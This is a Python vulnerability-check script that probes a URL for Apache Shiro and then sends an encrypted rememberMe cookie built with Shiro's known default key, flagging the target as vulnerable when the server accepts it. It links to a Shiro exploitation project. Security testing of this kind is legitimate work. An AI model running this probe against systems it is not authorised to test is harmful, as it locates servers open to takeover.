import requests

def verify(url):
    relsult = {
        'name': 'Shiro 默认密钥',
        'vulnerable': False,
        'attack': False,
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
    }
    payload_dict = {
        "kPH+bIxk5D2deZiIxcaaaA==": "3vakOJDcITulYawMdd4UijbPyPpv8wZkOZ7Yt0wBjT4GCmUbx1yXymqb1BLnkvBmJlQ/AWSKtysv9yV4IwHA2sr41OgrkhFABXpf3OJd8xei5RUuTMJVEVklCQuZD/diciR0hSKqwlw0vJ40XU41Osv2wsVVIurD7FoGziYufa74Jbo1VW7oWtWVNyaRLVyA",
    }
    if check_shiro(url):
        for key in payload_dict.keys():
            payload = payload_dict[key]
            cookies = {'rememberMe': payload}
            try:
                r = requests.get(url, headers=headers, cookies=cookies, timeout=3, verify=False, stream=True, allow_redirects=False)
                if 'rememberMe=deleteMe' not in str(r.headers):
                    relsult['vulnerable'] = True
                    relsult['url'] = url
                    relsult['key'] = key
                    relsult['about'] = 'https://github.com/feihong-cs/ShiroExploit'
                    return relsult
            except:
                continue
        return relsult
    else:
        return relsult

def check_shiro(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
    }
    cookies = {'rememberMe': "123"}
    try:
        res = requests.get(url, verify=False, headers=headers, cookies=cookies, timeout=3)
        if 'rememberMe=deleteMe' in str(res.headers):
            return True
        else:
            return False
    except:
        return False



